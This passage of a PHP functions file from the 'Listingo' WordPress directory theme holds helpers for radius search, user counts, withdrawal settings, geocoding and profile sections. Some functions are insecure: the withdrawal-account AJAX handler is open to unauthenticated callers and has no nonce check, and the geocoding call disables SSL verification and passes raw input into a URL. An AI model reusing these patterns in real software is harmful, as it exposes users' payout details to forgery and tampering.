			$dir_distance_type = 'mi';
		}

		if ($dir_distance_type === 'km') {
			$radius = $radius * 0.621371;
		}

		$Latitude	= !empty( $_GET['lat'] ) ? esc_attr( $_GET['lat'] ) : '';
		$Longitude	= !empty( $_GET['long'] ) ?  esc_attr( $_GET['long'] ) : '';

		$minLat = $maxLat = $minLong = $maxLong = 0;
		if( !empty( $Latitude ) && !empty( $Longitude ) ){
			$zcdRadius = new RadiusCheck($Latitude, $Longitude, $radius);
			$minLat = $zcdRadius->MinLatitude();
			$maxLat = $zcdRadius->MaxLatitude();
			$minLong = $zcdRadius->MinLongitude();
			$maxLong = $zcdRadius->MaxLongitude();
		}
		
		$data	= array(
			'default_lat'   => $Latitude,
			'default_long'  => $Longitude,
			'minLat'  => $minLat,
			'maxLat'  => $maxLat,
			'minLong' => $minLong,
			'maxLong' => $maxLong,
		);
		
		return $data;
	}
}

/**
 * @Sort by distance
 * @return array
 */
if (!function_exists('listingo_get_total_users_under_category')) {
	function listingo_get_total_users_under_category( $cat_id, $returntype='number' ) {

		/**
		 * Count Total users that have 
		 * been registered in categories.
		 */
		$query_args = array(
			'role__in' => array('professional', 'business'),
			'order' => 'DESC',
		);

		$meta_query_args = array();

		$meta_query_args[] = array(
			'key' => 'category',
			'value' => $cat_id,
			'compare' => '=',
		);
		//Verify user
		$meta_query_args[] = array(
			'key' => 'verify_user',
			'value' => 'on',
			'compare' => '='
		);
		//active users filter
		$meta_query_args[] = array(
			'key' => 'activation_status',
			'value' => 'active',
			'compare' => '='
		);

		if (!empty($meta_query_args)) {
			$query_relation = array('relation' => 'AND',);
			$meta_query_args = array_merge($query_relation, $meta_query_args);
			$query_args['meta_query'] = $meta_query_args;
		}

		$total_query = new WP_User_Query($query_args);
		if( $returntype === 'number' ){
			return $total_query->total_users;
		} else{
			return $total_query; //return query
		}
		
	}
}

/**
 * @Sort by distance
 * @return array
 */
if (!function_exists('listingo_get_total_users_under_taxanomy')) {
	function listingo_get_total_users_under_taxanomy( $val, $returntype='number', $key='' ) {

		/**
		 * Count Total users that have 
		 * been registered in categories.
		 */
		$query_args = array(
			'role__in' => array('professional', 'business'),
			'order' => 'DESC',
		);

		$meta_query_args = array();

		$meta_query_args[] = array(
			'key' 		=> $key,
			'value' 	=> $val,
			'compare' 	=> '=',
		);
		//Verify user
		$meta_query_args[] = array(
			'key' 		=> 'verify_user',
			'value' 	=> 'on',
			'compare'   => '='
		);
		//active users filter
		$meta_query_args[] = array(
			'key' 		=> 'activation_status',
			'value' 	=> 'active',
			'compare' 	=> '='
		);

		if (!empty($meta_query_args)) {
			$query_relation = array('relation' => 'AND',);
			$meta_query_args = array_merge($query_relation, $meta_query_args);
			$query_args['meta_query'] = $meta_query_args;
		}

		$total_query = new WP_User_Query($query_args);
		if( $returntype === 'number' ){
			return $total_query->total_users;
		} else{
			return $total_query; //return query
		}
		
	}
}

/**
 * @Save widthdrawal settings
 * @return {}
 */
if (!function_exists('listingo_save_withdrawal_settings')) {

    function listingo_save_withdrawal_settings() {
        global $current_user;
        $user_identity = $current_user->ID;
        $json = array();
        update_user_meta($user_identity, 'withdrawal_account', listingo_sanitize_array($_POST['withdrawal_account']));

        $json['type'] = 'success';
        $json['message'] = esc_html__('Settings updated.', 'listingo');
        echo json_encode($json);
        die;
    }

    add_action('wp_ajax_listingo_save_withdrawal_settings', 'listingo_save_withdrawal_settings');
    add_action('wp_ajax_nopriv_listingo_save_withdrawal_settings', 'listingo_save_withdrawal_settings');
}

/**
 * @Get DB Privacy Settings
 * @return {}
 */
if (!function_exists('listingo_get_withdrawal_settings')) {

    function listingo_get_withdrawal_settings($user_identity) {
        global $current_user, $wp_roles, $userdata, $post;
        $settings = array(
			'type' 		=> 'paypal',
			'paypal' 	=> '',
			'bank' 		=> '',
		);
		
        $db_settings = get_user_meta($user_identity, 'withdrawal_account', true);
		$db_settings	= !empty( $db_settings ) ? $db_settings : $settings;
		
		$db_settings	= array_merge($settings,$db_settings);

        return !empty( $db_settings ) ? $db_settings : $settings;
    }

}

/**
 * get latitude and longitude for search
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_get_location_lat_long' ) ) {
	function listingo_get_location_lat_long() {
		if (function_exists('fw_get_db_settings_option')) {
			$dir_longitude = fw_get_db_settings_option('dir_longitude');
			$dir_latitude  = fw_get_db_settings_option('dir_latitude');
			$google_key = fw_get_db_settings_option('google_key');
		} else{
			 $dir_longitude = '-0.1262362';
			 $dir_latitude 	= '51.5001524';
			 $google_key = '';
		}

		$current_latitude	= $dir_latitude;
		$current_longitude	= $dir_longitude;

		if( !empty( $_GET['lat'] ) && !empty( $_GET['long'] ) ){
			$current_latitude	= esc_attr( $_GET['lat'] );
			$current_longitude	= esc_attr( $_GET['long'] );
		} else{
			
			$args = array(
				'timeout'     => 15,
				'headers' => array('Accept-Encoding' => ''),
				'sslverify' => false
			);
			
			$address	 = !empty($_GET['geo']) ?  $_GET['geo'] : '';
			$prepAddr	= str_replace(' ','+',$address);
			
			$url	    = 'https://maps.google.com/maps/api/geocode/json?address='.$prepAddr.'&key='.$google_key;;
			$response   = wp_remote_get( $url, $args );
			$geocode	= wp_remote_retrieve_body($response);

			$output	  = json_decode($geocode);

			if( isset( $output->results ) && !empty( $output->results ) ) {
				$Latitude	 = $output->results[0]->geometry->location->lat;
				$Longitude   = $output->results[0]->geometry->location->lng;
			}
			
			if( !empty( $Latitude ) && !empty( $Longitude ) ){
				$current_latitude	= $Latitude;
				$current_longitude	= $Longitude;
			} else{
				$current_latitude	= $dir_latitude;
				$current_longitude	= $dir_longitude;
			}
		}
		
		$location	= array();
		
		$location['lat']	= $current_latitude;
		$location['long']	= $current_longitude;
		
		return $location;
	}
}

/**
 * get sorting list
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_get_sortbale_list' ) ) {
	function listingo_get_sortbale_list($Dkey='content',$user_id) {
		$list	= array(
			'content' => array(
				'company' => array('title' => esc_html__('Introduction','listingo'),
							'key'	=> 'company',
						 	'privacy_check' 		=> 'yes',
						  	'feature_check'			=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' 	=> '',
							'privacy_check_key' 	=> 'privacy_introduction',
							'subscription_check_key' 	=> ''
						 ),
				'language' => array('title' => esc_html__('Languages','listingo'),
							'key'	=> 'language',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'privacy_check_key' => 'privacy_languages',
							'subscription_check_key' 	=> ''
						 ),
				'experience' => array('title' => esc_html__('Experience','listingo'),
							'key'	=> 'experience',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'experience',
							'privacy_check_key' => 'privacy_experience',
							'subscription_check_key' 	=> ''
						 ),
				'awards' => array('title' => esc_html__('Awards','listingo'),
							'key'	=> 'awards',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'awards',
							'privacy_check_key' => 'privacy_awards',
							'subscription_check_key' 	=> ''
						 ),
				'qualification' => array('title' => esc_html__('Qualifications','listingo'),
							'key'	=> 'qualification',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'qualifications',
							'privacy_check_key' => 'privacy_qualification',
							'subscription_check_key' 	=> ''
						 ),
				'amenity' => array('title' => esc_html__('Amenities','listingo'),
							'key'	=> 'amenity',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'amenities',
							'privacy_check_key' => 'privacy_amenity',
							'subscription_check_key' 	=> ''
						 ),
				'insurance' => array('title' => esc_html__('Insurance','listingo'),
							'key'	=> 'insurance',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'yes',
							'subscription_check'	=> 'yes',
							'feature_check_key' => 'insurance',
							'privacy_check_key' => 'privacy_insurance',
							'subscription_check_key' 	=> 'subscription_insurance'
						 ),
				'services' => array('title' => esc_html__('Services','listingo'),
							'key'	=> 'services',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'privacy_check_key' => 'profile_service',
							'subscription_check_key' 	=> ''
						 ),
				'teams' => array('title' => esc_html__('Teams','listingo'),
							'key'	=> 'teams',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'yes',
							'subscription_check'	=> 'yes',
							'feature_check_key' => 'teams',
							'privacy_check_key' => 'profile_team',
							'subscription_check_key' 	=> 'subscription_teams'
						 ),
				'ads' => array('title' => esc_html__('Ads','listingo'),
							'key'	=> 'ads',
						 	'privacy_check' => 'no',
						  	'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'ads',
							'privacy_check_key' => '',
							'subscription_check_key' 	=> ''
						 ),
				'gallery' => array('title' => esc_html__('Gallery','listingo'),
							'key'	=> 'gallery',
						 	'privacy_check' => 'yes',
							'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
						  	'feature_check_key' => 'gallery',
							'privacy_check_key' => 'profile_gallery',
							'subscription_check_key' 	=> ''
						 ),
				'videos' => array('title' => esc_html__('Audio/Video','listingo'),
							'key'	=> 'videos',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'videos',
							'privacy_check_key' => 'profile_videos',
							'subscription_check_key' 	=> ''
						 ),
				'more-info-tabs' => array('title' => esc_html__('Reviews & Consult Question','listingo'),
							'key'	=> 'tabs',
						 	'privacy_check' => 'no',
						  	'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'privacy_check_key' => '',
							'subscription_check_key' 	=> ''
						 ),
			),
			'sidebar' => array(
				'qrcode' => array('title' => esc_html__('Get QRCode','listingo'),
							'key'	=> 'qrcode',
						 	'privacy_check' => 'no',
						  	'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'privacy_check_key' => '',
							'subscription_check_key' 	=> ''
						 ),
				'hours' => array('title' => esc_html__('Business Hours','listingo'),
							'key'	=> 'hours',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'no',
							'subscription_check'	=> 'yes',
							'feature_check_key' => '',
							'privacy_check_key' => 'profile_hours',
							'subscription_check_key' 	=> 'subscription_business_hours'
						 ),
				'contactform' => array('title' => esc_html__('Contact Form','listingo'),
							'key'	=> 'contactform',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'privacy_check_key' => 'profile_contact',
							'subscription_check_key' 	=> ''
						 ),
				'brochures' => array('title' => esc_html__('Download Brochure','listingo'),
							'key'	=> 'brochures',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'brochures',
							'privacy_check_key' => 'privacy_brochures',
							'subscription_check_key' 	=> ''
						 ),
				'job-openings' => array('title' => esc_html__('Job Openings','listingo'),
							'key'	=> 'jobs',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'privacy_check_key' => 'privacy_job_openings',
							'subscription_check_key' 	=> ''
						 ),
				'articles' => array('title' => esc_html__('Articles','listingo'),
							'key'	=> 'articles',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'privacy_check_key' => 'privacy_articles',
							'subscription_check_key' 	=> ''
						 ),
				'share' => array('title' => esc_html__('Social Share','listingo'),
							'key'	=> 'share',
						 	'privacy_check' => 'yes',
						  	'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'privacy_check_key' => 'privacy_share',
							'subscription_check_key' 	=> ''
						 ),
				'related' => array('title' => esc_html__('Related Providers','listingo'),
							'key'	=> 'related',
						 	'privacy_check' => 'no',
						  	'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'privacy_check_key' => '',
							'subscription_check_key' 	=> ''
						 ),
				'claim' => array('title' => esc_html__('Claim Listing','listingo'),
								'key'	=> 'claim',
								'privacy_check' => 'no',
								'feature_check'	=> 'yes',
								'subscription_check'	=> 'no',
								'feature_check_key' => 'claims',
								'privacy_check_key' => '',
								'subscription_check_key' 	=> ''
							 ),
			)
		);
		
		$provider_category = listingo_get_provider_category($user_id);
		$db_privacy = listingo_get_privacy_settings($user_id);

		$allowed_array	= array();
		
		if( !empty( $list[$Dkey] ) ){
			$list = apply_filters( 'listingo_filter_profile_sections', $list,$Dkey);
			foreach( $list[$Dkey] as $key => $value ){
				$is_feature_allowed			= 'yes';
				$is_privacy_allowed			= 'yes';
				$is_subscription_allowed	= 'yes';
				
				if( $value['feature_check'] === 'yes' ){
					if (apply_filters('listingo_is_feature_allowed', $provider_category, $value['feature_check_key']) === true) {
						$is_feature_allowed	= 'yes';
					}else{
						$is_feature_allowed	= 'no';
					}
				}
				
				if( $value['privacy_check'] === 'yes' ){
					if( isset($db_privacy[$value['privacy_check_key']]) && $db_privacy[$value['privacy_check_key']] === 'on' ){
						$is_privacy_allowed	= 'yes';
					}else{
						$is_privacy_allowed = 'no';	
					}
				}
				
				if( $value['subscription_check'] === 'yes' ){
					if( apply_filters('listingo_is_setting_enabled', $user_id, $value['subscription_check_key'] ) === true ){
						$is_subscription_allowed	= 'yes';
					}else{
						$is_subscription_allowed = 'no';	
					}
				}
				
				//jobs
				if( isset( $value['key'] ) && $value['key'] === 'jobs' ){
					if ( apply_filters('listingo_get_theme_settings', 'jobs') == 'yes') {
						$is_feature_allowed	= 'yes';
					}else{
						$is_feature_allowed	= 'no';
					}
				}

				//Articles
				if( isset( $value['key'] ) && $value['key'] === 'articles' ){
					if ( function_exists('fw_get_db_settings_option') && fw_ext('articles')) {
						$is_feature_allowed	= 'yes';
					}else{
						$is_feature_allowed	= 'no';
					}
				}

				if( $is_feature_allowed === 'yes' 
					&& $is_privacy_allowed === 'yes' 
					&& $is_subscription_allowed === 'yes'  
				){
					$allowed_array[$key]	= $value;
				}	
			}
		}
		
		return !empty( $allowed_array ) ? $allowed_array : array();
		
	}
}


	
/**
 * @get allowed packages features
 * @return {}
 */
if (!function_exists('check_allowed_packages_features')) {
	function  check_allowed_packages_features(){
		$list	= array(
			'sp_appointments' => array('title' => esc_html__('Appointments','listingo'),
						'key'	=> 'appointments',
						'feature_check'	=> 'yes',
						'feature_check_key' => 'appointments',
					 ),
			'sp_videos' => array('title' => esc_html__('Audio/Video','listingo'),
						'key'	=> 'videos',
						'feature_check'	=> 'yes',
						'feature_check_key' => 'videos',
					 ),
			'sp_insurance' => array('title' => esc_html__('Insurance','listingo'),
						'key'	=> 'insurance',
						'feature_check'	=> 'yes',
						'feature_check_key' => 'insurance',
					 ),
			'sp_teams' => array('title' => esc_html__('Teams','listingo'),
						'key'	=> 'teams',
						'feature_check'	=> 'yes',
						'feature_check_key' => 'teams',
					 ),
			'sp_jobs' => array('title' => esc_html__('Jobs','listingo'),
						'key'	=> 'jobs',
						'feature_check'	=> 'no',
						'feature_check_key' => 'jobs',
					 ),
			'sp_articles' => array('title' => esc_html__('Articles','listingo'),
						'key'	=> 'articles',
						'feature_check'	=> 'no',
						'feature_check_key' => 'articles',
					 ),
		);
		
		return $list;
		
	}
}

/**
 * @get settings
 * @return {}
 */
if (!function_exists('listingo_get_provider_page_style')) {
	function  listingo_get_provider_page_style($user_id){
		if (function_exists('fw_get_db_settings_option')) {
			$page_design = fw_get_db_settings_option('page_design');
		} else{
			 $page_design  = 'view_1';
		}
		
		$page_design		= !empty( $page_design ) ? $page_design : 'view_1';
		$sp_style_settings	=  get_user_meta($user_id, 'provider_page_style', true);
		$sp_style_settings	= !empty( $sp_style_settings ) ? $sp_style_settings : $page_design;
		return $sp_style_settings;
	}
}

/**
 * @get settings
 * @return {}
 */
if (!function_exists('listingo_profile_settings')) {
	function  listingo_profile_settings(){
		$list	= array(
			'media'	 		=> 'media',
			'introduction'	=> 'introduction',
			'categories'	=> 'categories',
			'timezone'		=> 'timezone',
			'basics'	 	=> 'basics',
			'social'	 	=> 'social',
            'facebook-chat' => 'facebook-chat',
			'locations'	 	=> 'locations',
			'languages'	 	=> 'languages',
			'awards'	 	=> 'awards',
			'experience'	=> 'experience',
			'qualification'	=> 'qualification',
			'amenities'	 	=> 'amenities',
			'insurance'	 	=> 'insurance',
			'gallery'	 	=> 'gallery',
			'videos'	 	=> 'videos',
			'brochures'	 	=> 'brochures',
		);
		return $list;
	}
}

/**
 * Check if user is verified user
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_is_user_verified_message' ) ) {
	function listingo_is_user_verified_message() {
		global $current_user, $wp_roles,$userdata,$post;
		$user_identity	= $current_user->ID;
		
		if ( isset($_COOKIE['sp_cache_verification_'.$user_identity])) {return;}
		
		if ( apply_filters('listingo_get_user_type', $user_identity) === 'business' 
			 || apply_filters('listingo_get_user_type', $user_identity) === 'professional'
		) {
			$message	= wp_kses( __( "You are not a verified user! If you didn\'t get verification email, Please contact to administrator to get verified.<br/>Note: Your account will not be shown publicly until your account will get verified.", 'listingo' ),array(
																'a' => array(
																	'href' => array(),
																	'title' => array()
																),
																'br' => array(),
																'em' => array(),
																'strong' => array(),
															));

			$script	= "jQuery.sticky('".$message."', {classList: 'important sp-cacheit cache-verification',position:'center-center', speed: 200, autoclose: 50000000})";
			wp_add_inline_script('listingo_callbacks', $script, 'after');
		} else{
			$message	= wp_kses( __( "You are not a verified user! If you didn\'t get verification email, Please contact to administrator to get verified.", 'listingo' ),array(
																'a' => array(
																	'href' => array(),
																	'title' => array()
																),
																'br' => array(),
																'em' => array(),
																'strong' => array(),
															));

			$script	= "jQuery.sticky('".$message."', {classList: 'important sp-cacheit cache-verification',position:'center-center', speed: 200, autoclose: 50000000})";
			wp_add_inline_script('listingo_callbacks', $script, 'after');
		}
		
	}
}

/**
 * Check if user is active user
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_user_profile_status_message' ) ) {
	function listingo_user_profile_status_message() {
		global $current_user;
		$current_user_id	= !empty( $current_user->ID ) ? $current_user->ID : '';
		
		if ( isset($_COOKIE['sp_cache_deactivation_'.$current_user_id])) {return;}
		
		$message	= wp_kses( __( 'Your account is de-active, please activate your account.<br/> Note: Your account will not be shown publicly until you activate your account. <br/> To activate please go to Security Settings', 'listingo' ),array(
															'a' => array(
																'href' => array(),
																'title' => array()
															),
															'br' => array(),
															'em' => array(),
															'strong' => array(),
														));
		
		$script	= "jQuery.sticky('".$message."', {classList: 'important sp-cacheit cache-deactivation',position:'center-center', speed: 200, autoclose: 50000000})";
		wp_add_inline_script('listingo_callbacks', $script, 'after');
	}
}

/**
 * get woocommmerce currency settings
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_get_current_currency' ) ) {
	function listingo_get_current_currency() {
		$currency	= array();
		if (class_exists('WooCommerce')) {
			$currency['code']	= get_woocommerce_currency();
			$currency['symbol']	= get_woocommerce_currency_symbol();
		} else{
			$currency['code']	= 'USD';
			$currency['symbol']	= '$';
		}
		
		return $currency;
	}
}

/**
 * format woocommmerce price
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_format_price' ) ) {
	function listingo_format_price($price) {
		if (class_exists('WooCommerce')) {
			$price = wc_price( $price );
		} else{
			$currency	= listingo_get_current_currency();
			$price = !empty($currency['symbol'] ) ? $currency['symbol'].$price : '$';
		}
		
		return $price;
	}
}

/**
 * format woocommmerce price
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_is_feature_support' ) ) {
	function listingo_is_feature_support($key) {
		if( isset( $key ) && $key === 'yes' ){
			$feature	= '<i class="fa fa-check-circle sp-pk-allowed"></i>';
		} else{
			$feature	= '<i class="fa fa-times-circle sp-pk-not-allowed"></i>';
		}
		return $feature;
	}
}

/**
 * get calendar date format
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_get_calendar_format' ) ) {
	function listingo_get_calendar_format() {
		if (function_exists('fw_get_db_settings_option')) {
			$calendar_locale    = fw_get_db_settings_option('calendar_locale');
			$calendar_format	= !empty( $calendar_format ) ?  $calendar_format : 'Y-m-d';
		}else{
			$calendar_format	= 'Y-m-d';
		}
		
		return $calendar_format;
	}
}



/**
 * get calendar date format
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_get_social_settings_value' ) ) {
    function listingo_get_social_settings_value($parent,$key,$sub_key,$user_identity) {
        $api_settings   =  get_user_meta($user_identity, 'sp_social_api', true);
        return !empty( $api_settings[$parent][$key][$sub_key] ) ? $api_settings[$parent][$key][$sub_key] : '';
    }
}

/**
 * get field width
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_get_field_width' ) ) {
    function listingo_get_field_width() {
		
		if (function_exists('fw_get_db_settings_option')) {
			$dir_location = fw_get_db_settings_option('dir_location');
			$dir_keywords = fw_get_db_settings_option('dir_keywords');
		} else {
			$dir_keywords = '';
			$dir_location = '';
		}
		
       if( ( isset( $dir_keywords ) && $dir_keywords === 'enable' ) 
		   && isset( $dir_location ) && $dir_location === 'enable' ){
			$width	= 'one_third_search';
		} else if( ( isset( $dir_keywords ) && $dir_keywords === 'enable' ) 
		   || isset( $dir_location ) && $dir_location === 'enable' ){
			$width	= 'half_search';
		} else if( ( isset( $dir_keywords ) && $dir_keywords === 'disable' ) 
		   && isset( $dir_location ) && $dir_location === 'disable' ){
			$width	= 'full_search';
		} else{
			$width	= 'one_third_search';
		}
		
		return $width;
    }
}

/**
 * get search page uri
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_get_search_page_uri' ) ) {
    function listingo_get_search_page_uri() {
		if (function_exists('fw_get_db_settings_option')) {
    		$dir_search_page = fw_get_db_settings_option('dir_search_page');
		}
		
		if (isset($dir_search_page[0]) && !empty($dir_search_page[0])) {
			$search_page = get_permalink((int) $dir_search_page[0]);
		} else {
			$search_page = '';
		}
		
		return $search_page;
	}
}

/**
 * get login page uri
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_get_login_registration_page_uri' ) ) {
    function listingo_get_login_registration_page_uri() {
		$login_register = '';
		$login_reg_link = '#';
		if (function_exists('fw_get_db_settings_option')) {
			$login_register = fw_get_db_settings_option('enable_login_register');
		}

		if (!empty($login_register['enable']['login_reg_page'])) {
			$login_reg_link = $login_register['enable']['login_reg_page'];
		}
		
		if( !empty( $login_reg_link[0] ) ){
			return get_permalink((int) $login_reg_link[0]);
		} else{
			return '#';
		}	
	}
}

/**
 * get search filter width
 *
 * @param sting
 * @return string
 */
if ( ! function_exists( 'listingo_get_column_type' ) ) {
    function listingo_get_column_type($is_subcat,$geo_type='') {
		if (function_exists('fw_get_db_settings_option')) {
    		$dir_keywords = fw_get_db_settings_option('dir_keywords');
			$dir_location = fw_get_db_settings_option('dir_location');
			$country_cities = fw_get_db_settings_option('country_cities');
		}
		
		$width	= 1;
		if( isset( $is_subcat ) && $is_subcat === 'yes' ){
			$width++;
		}
		
		if( isset( $dir_keywords ) && $dir_keywords === 'enable' ){
			$width++;
		} 
		
		if( isset( $dir_location ) && $dir_location === 'enable' && $geo_type === 'geo' ){
			$width++;
		} else if( isset( $country_cities ) && ( $country_cities === 'countries_only' || $country_cities === 'enable' )  && $geo_type === 'countries' ){
			$width++;
		}
		
		$column	= 'sp-column-'.$width;
		
		return $column;
	}
}

//Function to get profile status
if( !function_exists(  'listingo_get_status_list' ) ) {
	function listingo_get_status_list(){
		$list	= array(
			'offline' => array(
				'classes' => 'offline',
				'title'   => esc_html__('Offline','listingo')
			),
			'online' => array(
				'classes' => 'online',
				'title'   => esc_html__('Online','listingo')
			),
			'busy' => array(
				'classes' => 'busy',
				'title'   => esc_html__('Busy','listingo')
			),
			'away' => array(
				'classes' => 'away',
				'title'   => esc_html__('Away','listingo')
			),
			'sphide' => array(
				'classes' => 'sphide',
				'title'   => esc_html__('Hide status','listingo')
			)
			
		);
		
		return $list;
	}
}

//Function to get profile status
if( !function_exists(  'listingo_get_profile_status' ) ) {
	function listingo_get_profile_status($view='one',$type='echo',$user_id){
		if( empty($user_id)){return;}
		
		ob_start();
		
		$profile_status	= get_user_meta($user_id,'profile_status',true);
		$statuses		= listingo_get_status_list();

		if( isset( $view ) && $view === 'one'){
			//print code
		} else{
			if( !empty( $profile_status ) && $profile_status != 'sphide' && !is_array( $profile_status )){
			?>
				<div class="displaystatus-wrap sp-<?php echo esc_attr($statuses[$profile_status]['classes']);?>">
					<span><?php esc_html_e('Status','listingo');?>:</span>
					<span><i class="fa fa-circle"></i>&nbsp;<?php echo esc_attr($statuses[$profile_status]['title']);?></span>
				</div>
			<?php
			} 
		}
		
		if( isset( $type ) && $type === 'return'){
			return ob_get_clean();
		} else{
			echo ob_get_clean();
		}
	}
}

/**
 * @get id by slug
 * @return true/false
 */
if (!function_exists('listingo_get_term_by_type')) {

    function listingo_get_term_by_type($from = 'slug', $value = "", $taxonomy = 'sub_category', $return = 'id') {

        $term = get_term_by($from, $value, $taxonomy);

        if (!empty($term)) {
            if ($from === 'slug' && $return === 'id') {
                return $term->term_id;
            } elseif ($from === 'id' && $return === 'slug') {
                return $term->slug;
            } elseif ($from === 'name' && $return === 'id') {
                return $term->term_id;
            } elseif ($from === 'id' && $return === 'name') {
                return $term->name;
            } elseif ($from === 'name' && $return === 'slug') {
                return $term->slug;
            } elseif ($from === 'slug' && $return === 'name') {
                return $term->name;
            } else {
                return $term->term_id;
            }
        }

        return false;
    }
}

/**
 * @get total posts
 * @return array()
 */
if (!function_exists('listingo_get_total_posts_by_user')) {

    function listingo_get_total_posts_by_user($user_id = '',$type='sp_ads') {
        if (empty($user_id)) {
            return 0;
        }

        $args = array('posts_per_page' => '-1',
            'post_type' => $type,
            'post_status' => 'publish',
            'author' => $user_id,
            'suppress_filters' => false
        );
        $query = new WP_Query($args);
        return $query->post_count;
    }
}